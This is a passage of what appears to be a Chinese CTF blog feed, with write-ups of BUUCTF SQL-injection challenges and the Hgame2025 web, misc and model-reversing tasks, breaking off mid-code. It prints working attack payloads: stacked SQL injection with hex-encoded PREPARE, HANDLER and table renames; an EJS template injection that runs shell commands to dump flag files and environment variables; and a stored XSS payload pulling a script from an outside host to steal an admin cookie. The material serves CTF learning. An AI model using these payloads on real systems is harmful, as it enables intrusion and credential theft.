class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br><br>方法二：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br><br>方法三：<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure><p>本题因为可以堆叠注入且过滤了 select 关键字，所以先将关键字拆开通过 concat 方法拼接并预编译，来绕过检测，然后再执行预编译好的查询语句获取 flag。</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;D3TEbhvlPopwvIxQkQ7cVK9gnzN.png)</p><h2 id="方法二：预编译-十六进制编码绕过"><a href="#方法二：预编译-十六进制编码绕过" class="headerlink" title="方法二：预编译 + 十六进制编码绕过"></a>方法二：预编译 + 十六进制编码绕过</h2><p>可以直接将 <code>select * from </code> 1919810931114514&#96;&#96; 语句进行 16 进制编码，即：<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>，替换 payload 预编译：</p><p><code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</code></p><p>基本原理同上</p><h2 id="方法三：handler-替换-select（仅-MySQL）"><a href="#方法三：handler-替换-select（仅-MySQL）" class="headerlink" title="方法三：handler 替换 select（仅 MySQL）"></a>方法三：handler 替换 select（仅 MySQL）</h2><p><code>1&#39;;HANDLER </code> 1919810931114514 <code>OPEN;HANDLER</code> 1919810931114514 <code>READ FIRST;HANDLER</code> 1919810931114514 <code> CLOSE;#</code> 直接获取 flag</p><p>mysql 除可使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能，并且是 mysql 专用的语句，并没有包含到 SQL 标准中。</p><p>handler 使用格式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">打开表：<br>HANDLER 表名 <span class="hljs-keyword">OPEN</span> ;<br><br>查看数据：<br>HANDLER 表名 READ next;<br><br>关闭表：<br>HANDLER 表名 READ <span class="hljs-keyword">CLOSE</span>;<br></code></pre></td></tr></table></figure><p>本题即先用 handler 打开 <code>1919810931114514</code> 表，读取表的第一行数据，然后关闭表</p><h2 id="方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）"><a href="#方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）" class="headerlink" title="方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）"></a>方法四：根据原本查询语句的逻辑修改表名和列名（相对取巧）</h2><p>我们输入 1 后，默认会显示 id 为 1 的数据，可以猜测默认显示的是 words 表的数据，那么只要更改目标表的名称和结构为 words 表、words 表改成其他名称，就可以达到利用原有查询语句直接查询 flag 字段的值的效果</p><p>修改表名、添加列的语法格式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">修改表名：<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 旧表名 RENAME <span class="hljs-keyword">TO</span> 新表名;<br><br>修改字段：<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 CHANGE 旧字段名 新字段名 新数据类型;<br><br>添加列：<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> TABLE_NAME <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> NEW_COLUMN_NAME <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">first</span>;<br></code></pre></td></tr></table></figure><p>查看 words 表结构 <code>1&#39;;desc words;#</code> 总共两个字段 id 和 data，推测应该是输入 id 给出对应 data</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;TnErbguBhoNNlgxeylXc356Fnh7.png)</p><p>那么我们可以把 words 表随便改成其他名称，然后把目标 1919810931114514 表改成 words，再把列名 flag 改成 data，在最前列添加 id 列即可实现查询</p><p><code>1&#39;; alter table words rename to words1;alter table </code> 1919810931114514 <code>rename to words;alter table words change flag data varchar(50);alter table words add column id int(10) not null first;#</code></p><p>执行后，先读取了原本 words 表的 id&#x3D;1 的 data 并返回输出</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;H2nHbYVZRoI1r7xBQKZcaohhnRg.png)</p><p>输入（id）0 查询，即得 flag</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;D8gdb3B62oci4Ix8brjc1Xbon2b.png)</p><p>或者参考我所参考的知乎那篇 wp，直接将 flag 重命名为 id，然后 <code>1&#39; or 1=1#</code> 查看所有内容</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a></p><p><a href="https://ek1ng.com/notes.html#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8">https://ek1ng.com/notes.html#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>还是先用 BP 扫一遍，可以看到许多关键词如 and、from、information 被过滤，联合注入、报错注入基本排除</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;T6Trb69KpoBDWDx9kDmcnkqEnsc.png)</p><p>综合考虑先尝试堆叠注入，输入 <code>1;show databases;#</code>，成功获取数据库名，说明是数字型无需其他闭合，且堆叠注入可行</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;KGXUbk5GooGT6Sxv8ypcLW5xnoh.png)</p><p>继续输入 <code>1;show tables;#</code>，发现 Flag 表</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;HaLqbQoEcoXOvSxR864cGDk3nth.png)</p><p>尝试 handler 读取 <code>1;handler Flag open;handler Flag read first;handler Flag close;#</code>，结果发现 Flag 被过滤，因为 handler 和 from 被过滤，也无法使用前一题的预编译绕过，其他各种绕过方法试了一遍，过长时也会拦截，最后只能借鉴网上的 WP。</p><p>这道题需要推测查询语句的大致结构，这里的 sql 语句为 <code>select $post[&#39;query&#39;]||flag from Flag</code>，表现出来的特征是输入非零时有回显，输入 0 或其他字符时均无回显或是报错，做题时需要根据这个特征推测才能继续做下去。</p><h2 id="方法一：修改-sql-mode"><a href="#方法一：修改-sql-mode" class="headerlink" title="方法一：修改 sql_mode"></a>方法一：修改 sql_mode</h2><p>修改 MySQL 服务的环境变量 sql_mode，用于设置 MySQL 支持的语法和数据校验模式。本题将 sql_mode 设为 <code>pipes_as_concat</code>，作用是将 || 的作用由 or 变为拼接字符串。</p><p>所以输入 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code> 时原有的查询语句就会将 <code>select 1</code> 和 <code>select flag from Flag</code> 的结果拼接在一起返回。</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;F3LUbtmpFomIgYxYKTscUwpSnZd.png)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">附加几种常见的sql_mode值的介绍：<br><br>几种常见的mode介绍<br>ONLY_FULL_GROUP_BY：出现在<span class="hljs-keyword">select</span>语句、<span class="hljs-keyword">HAVING</span>条件和<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span>语句中的列，必须是<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>的列或者依赖于<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>列的函数列。<br><br>NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入<span class="hljs-number">0</span>或<span class="hljs-keyword">NULL</span>代表生成下一个自增长值。如果用户希望插入的值为<span class="hljs-number">0</span>，而该列又是自增长的，那么这个选项就有用了。<br><br>STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制<br><br>NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含<span class="hljs-number">0</span>。如果开启此模式，<span class="hljs-number">2016</span><span class="hljs-number">-01</span><span class="hljs-number">-00</span>是不允许的，但是<span class="hljs-number">0000</span><span class="hljs-number">-02</span><span class="hljs-number">-01</span>是允许的。它实际的行为受到 <span class="hljs-keyword">strict</span> mode是否开启的影响<span class="hljs-number">1</span>。<br><br>NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响<span class="hljs-number">2</span>。<br><br>ERROR_FOR_DIVISION_BY_ZERO：在<span class="hljs-keyword">INSERT</span>或<span class="hljs-keyword">UPDATE</span>过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回<span class="hljs-keyword">NULL</span><br><br>NO_AUTO_CREATE_USER：禁止<span class="hljs-keyword">GRANT</span>创建密码为空的用户<br><br>NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常<br><br>PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似<br><br>ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符<br></code></pre></td></tr></table></figure><h2 id="方法二：满足-的条件"><a href="#方法二：满足-的条件" class="headerlink" title="方法二：满足 || 的条件"></a>方法二：满足 || 的条件</h2><p>如果 <code>$post[‘query’]</code> 的数据为 <code>*,1</code>，sql 语句就变成了 <code>select *,1||flag from Flag</code>，也就是 <code>select *,1 from Flag</code>，可以直接查询出 Flag 表中的所有内容。输入 <code>1;select *,1</code></p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Zey3bJzAMoqJcIx0tC7c8lErnyc.png)</p><h2 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://ek1ng.com/notes.html#SUSCTF2019-EasySQL">https://ek1ng.com/notes.html#SUSCTF2019-EasySQL</a></p><p><a href="https://www.cnblogs.com/gtx690/p/13176458.html">https://www.cnblogs.com/gtx690/p/13176458.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2025 WP</title>
    <link href="/2025/03/02/Hgame2025WP/"/>
    <url>/2025/03/02/Hgame2025WP/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2025WP"><a href="#Hgame2025WP" class="headerlink" title="Hgame2025WP"></a>Hgame2025WP</h1><h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="TEST-NC"><a href="#TEST-NC" class="headerlink" title="TEST NC"></a>TEST NC</h3><p>连接后 <code>cat flag</code></p><h3 id="从这里开始的序章"><a href="#从这里开始的序章" class="headerlink" title="从这里开始的序章"></a>从这里开始的序章</h3><p>复制粘贴</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>抓包没有发现通信，纯前端 js 的小游戏</p><p>禁用 F12，其他方式打开开发者工具，审计代码，发现大量名称被重命名混淆，未能找到 gameover、alert、flag 等相关有效信息，所以尝试通关游戏获得 flag。</p><p>在 index.js 发现记录地图数据的 <code>map</code> 字段，经比对发现 0x0 为可移动的空地，0x1 为墙，0x2 为敌人可通过的通道，而后发现 <code>_LIFE = 0x5,_SCORE = 0x0;</code> 分别记录生命值和初始分数。而通关的要求是总分达到 10000 且逃离（完成所有关卡 level）所以总的思路是：修改初始分数到达要求，改变地图结构来快速通关（测试发现要吃完一关内所有豆子才能到下一个关卡，只有 0x0 会刷豆子）并防止敌人扣除生命值</p><p>操作：</p><p>利用 Chrome 的 Overrides 功能将 js 代码重载，用本地文件覆盖</p><p>修改 <code>_SCORE = 0x10000;</code> 直接满足分数要求（16^4）</p><p>用脚本生成一个新地图，限制敌人行动、减少豆子刷新，粘贴替换到 js 文件中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">new_maps=[[[<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>)]<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>)]<br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">31</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">28</span>):<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">12</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> c &gt;= <span class="hljs-number">10</span> <span class="hljs-keyword">and</span> c &lt;= <span class="hljs-number">17</span> <span class="hljs-keyword">or</span> (c == <span class="hljs-number">10</span> <span class="hljs-keyword">or</span> c == <span class="hljs-number">17</span>) <span class="hljs-keyword">and</span> i &gt; <span class="hljs-number">12</span> <span class="hljs-keyword">and</span> i &lt; <span class="hljs-number">16</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x1&#x27;</span><br>            <span class="hljs-keyword">elif</span> i == <span class="hljs-number">23</span> <span class="hljs-keyword">and</span> c == <span class="hljs-number">13</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x0&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x2&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;map.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>front=<span class="hljs-string">&quot;&#123;&#x27;map&#x27;: [&quot;</span><br>behind=<span class="hljs-string">&quot;\n&#x27;wall_color&#x27;: _0x3a9ed7(0x12c),&#x27;goods&#x27;: &#123;&#x27;1,3&#x27;: 0x1,&#x27;26,3&#x27;: 0x1,&#x27;1,23&#x27;: 0x1,&#x27;26,23&#x27;: 0x1&#125;&#125;,\n&quot;</span><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>):<br>    f.write(front)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">31</span>):<br>        f.write(<span class="hljs-string">&#x27;[&#x27;</span>)<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">28</span>):<br>            <span class="hljs-keyword">if</span> c == <span class="hljs-number">27</span>:<br>                f.write(new_maps[m][i][c])<br>                <span class="hljs-keyword">continue</span><br>            f.write(new_maps[m][i][c]+<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">30</span>:<br>            f.write(<span class="hljs-string">&#x27;]&#x27;</span>)<br>        f.write(<span class="hljs-string">&#x27;],&#x27;</span>)<br>    f.write(behind)<br>f.close()<br></code></pre></td></tr></table></figure><p>修改完后保存，刷新页面</p><p><img src="/img/Hgame2025WP/UbBBbUvyRojxIax1hBccxvlHnbd.png"></p><p>游戏一开始只要吃掉原地的豆子就进入下一关，瞬间刷满通关，获得 flag（简单 base64+ 栅栏 fence 解码）</p><p><img src="/img/Hgame2025WP/Y3ySbNIZMoEK5txChctcZ6XTnbf.png"></p><h3 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h3><p>审计 app.js 代码，<code>/upload</code> 路由上传文件到 <code>/app/uploads/</code> 目录，没有什么限制，<code>/rename</code> 路由处理重命名，同样几乎没有限制，可以实现目录穿越，相对路径基于 <code>/app/uploads/</code> 目录，<code>/</code> 路由列出 <code>/app/uploads/</code> 目录下的所有文件。使用 express 框架，渲染 ejs 模板返回前端，本地的 <code>/app/public/</code> 目录映射到 <code>/static</code> 路由存放静态资源。</p><p>接下来上靶机，上传任意文件 app.js，使用 BP 向 <code>/rename</code> POST 方法发包，修改文件名 newName 为 <code>../app.js</code> 即可移动文件到 <code>/app/</code> 目录，覆盖原 app.js，但是服务不重启无法利用。同时利用 rename 可以作用于任意目录的文件所以也可以试探文件是否存在，若存在可成功重命名，若不存在则会返回 500 报错。</p><p>考虑靶机为 Nodejs 环境，排除一句话木马，尝试 ejs 模板注入。用 rename 试探到 <code>/app/view/mortis.ejs</code>，将其重命名为 <code>../public/mortis.ejs</code>，下载修改插入</p><p><code>&lt;%= process.mainModule.require(&#39;child_process&#39;).execSync(&#39;find / -type f -name &quot;*flag*&quot; 2&gt;/dev/null -exec cat &#123;&#125; +&#39;) %&gt;</code>，再上传用 rename 移入 <code>/app/view/</code>，刷新，成功执行命令得到返回，但没有找到 flag。</p><p>这里找了好一会，最后在环境变量里终于找到了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%= <br>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> execSync = process.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">execSync</span>;<br>  <span class="hljs-keyword">const</span> env = <span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;env&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>  <span class="hljs-keyword">const</span> procCmdline = <span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;cat /proc/1/cmdline&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`环境变量:\n<span class="hljs-subst">$&#123;env&#125;</span>\n\n进程参数:\n<span class="hljs-subst">$&#123;procCmdline&#125;</span>`</span>;<br>&#125;)()<br> %&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025WP/NmUCbDUgtotJtIx6TC1cN1nEnP1.png"></p><h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p><img src="/img/Hgame2025WP/C60ObFUJhoAtywx3H3ucTSQKncd.png"></p><p>先登录，用户名应该是 shallot，尝试用 BP 爆破，爆出密码 888888</p><p><img src="/img/Hgame2025WP/IAhcbF5lLoY3QTxLPW0czp0Bnl7.png"></p><p>随后进入留言板，提交 <code>&lt;script&gt;alert(&#39;123&#39;)&lt;/script&gt;</code> 出现弹窗，似乎没有过滤，可以整存储型 XSS，去获取 admin 的 cookie。所以拿 XSS 网站的 payload <code>&lt;sCRiPt sRC=//xs.pe/0c9&gt;&lt;/sCrIpT&gt;</code> 监听即可。</p><p><img src="/img/Hgame2025WP/Bi4bbrUHIoxldRx2Yf4cuzeKnpd.png"></p><p>一开始以为这句“admin 才不会来看你”是反话，是给的提示，后来发现还真没来，被自己无语到了……</p><p>然后突然想起来忘记目录扫描了，一扫扫出来一个 <code>/admin</code></p><p><code>好吧好吧你都这么求我了～admin只好勉为其难的来看看你写了什么～才不是人家想看呢！</code></p><p>……我想这应该行了，然而不知道什么原因还是没有收获。</p><p>后来题目又提供了部分源码，发现思路应该是对的，重新试了一遍，这回成了，得到 admin 的 cookie，访问 <code>/flag</code> 用 BP 修改 cookie 为 admin 的，得到 flag</p><p><img src="/img/Hgame2025WP/QYIlbVcTwoXNRAxaGRgcs3pvn0b.png"></p><p><img src="/img/Hgame2025WP/FT01b9hU0oVaCMxpuIycHxFcnZc.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Hakuya-Want-A-Girl-Friend"><a href="#Hakuya-Want-A-Girl-Friend" class="headerlink" title="Hakuya Want A Girl Friend"></a>Hakuya Want A Girl Friend</h3><p>附件 hky.txt 全是 16 进制的文本，开头 <code>50 4B 03 04</code> zip 的文件头，寻找文件尾发现 <code>50 4B 05 06 00 00 00 00 02 00 02 00 C1 00 00 00 9D 00 00 00 00 00</code>，后面还有一长串的冗余估计有其他信息隐藏在冗余部分。冗余部分开头 <code>82 60 42 AE</code>，结尾 <code>47 4E 50 89</code>，推测应该是把 png 图片的编码以一个 16 进制为单位倒转顺序了，正常 png 文件头 <code>89 50 4E 47</code>，结尾 <code>AE 42 60 82</code>。</p><p>所以将两部分文本分开，前部分写个 python 转成二进制文件保存为 zip 后缀即可正常打开，里面有密码加密。</p><p>后面部分先写个 python 把 16 进制数的顺序反转，再用上面的同一个程序转成二进制文件保存为 png 后缀即可。</p><p>然而图片中未找到密码，推测文件宽高被修改，利用 crc 校验得正确宽高 <code>576 779</code>，修改获得隐藏的密码。进入压缩包得 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br>crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;new_hky1.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \<br>            struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span>(crc32 == <span class="hljs-number">0xA672282D</span>):    <span class="hljs-comment">#图片当前CRC</span><br>            <span class="hljs-built_in">print</span>(i, j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hex:&#x27;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025WP/IBGJbM15ao7yAxxNaRicVpKBnwr.png"></p><h3 id="Level-314-线性走廊中的双生实体"><a href="#Level-314-线性走廊中的双生实体" class="headerlink" title="Level 314 线性走廊中的双生实体"></a>Level 314 线性走廊中的双生实体</h3><p>附件提供了一个神经网络模块 entity.pt 文件，根据题目的提示加载使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">entity = torch.jit.load(<span class="hljs-string">&#x27;entity.pt&#x27;</span>)   <span class="hljs-comment">#加载</span><br><span class="hljs-comment">#准备一个形状为[█，██]的张量，确保其符合“█/█稳定态”条件。</span><br>output = entity(input_tensor)   <span class="hljs-comment">#将张量输入实体以尝试激活信息</span><br></code></pre></td></tr></table></figure><p>先是随便准备了一个张量 tensor([4,14])，报错，意识到提示给的是“形状”，然后搞了一个形状[4,14]的张量，报错</p><p><code>RuntimeError: mat1 and mat2 shapes cannot be multiplied (4x14 and 10x10)</code>，说明内部有矩阵乘法运算且另一个矩阵形状为[10,10]。所以换一个形状[4,10]的张量，<code>print(output)</code> 就有正常输出了，但由于一开始我是 0 到 1 线性取值组成的张量，均值很小，所以没有看到任何有用信息。</p><p>索性开始调试，在 <code>output = entity(input_tensor)</code> 处打断点，查看 entity 的信息。</p><p>顶层的 forward 推理部分如下，<code>linear1 -&gt; security -&gt; relu -&gt; linear2</code></p><p><img src="/img/Hgame2025WP/Q2KUbsSQ0oBWWCxX6g8cb4Qanaf.png"></p><p>linear1 和 linear2 均是使用 <code>torch.nn.functional.linear(input,weight,bias)</code> 做线性变换，<code>output=input*weight+bias</code>，分别使用了形状(10,10)的 weight 和(10,)的 bias、形状(1,10)的 weight 和(1,)的 bias。</p><p><img src="/img/Hgame2025WP/K3TFb1wkXofsMoxXJa4cAx5inQb.png"></p><p><img src="/img/Hgame2025WP/KgynblxjPo2ggnx96LccdhlanAh.png"></p><p>security 的 forward 部分</p><p>当满足 <code>torch.allclose(torch.mean(x0), torch.tensor(0.31415000000000004), rtol=1.0000000000000001e-05, atol=0.0001)</code> 时会从 flag 数组中逐字读取并与 85 异或，拼接输出。其中 <code>torch.mean(x0)</code> 为对张量内所有值取平均（未指定维度），<code>torch.allclose(A,B,rtol,atol)</code> 比较 A、B 两个元素是否接近，|A-B| &lt;&#x3D; atol+rtol*|B| 则为 true。所以综上，要获得 flag，就要使输入的张量 x 经过 linear1 处理后取平均极度接近于 0.31415。（估计这里就是题目暗示的“周率”、和“十方境界”了吧，π*10^-1）</p><p>此外当满足 <code>torch.gt(torch.mean(x),0.5)</code> 时，也就是取平均后大于 0.5 时拼接、输出 fake_flag。（此处的 bool()应该不是 python 自带的 bool 函数，如果是的话那么这条判断应该始终为 true，也就不会出现我一开始的情况了吧，一开始取值太小，又不接近 0.31415，就什么有用的都没）</p><p><img src="/img/Hgame2025WP/MVEPbeJI4o7GCOxjYPScVyO3n3c.png"></p><p>分析完成后写脚本跑出正确的张量输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 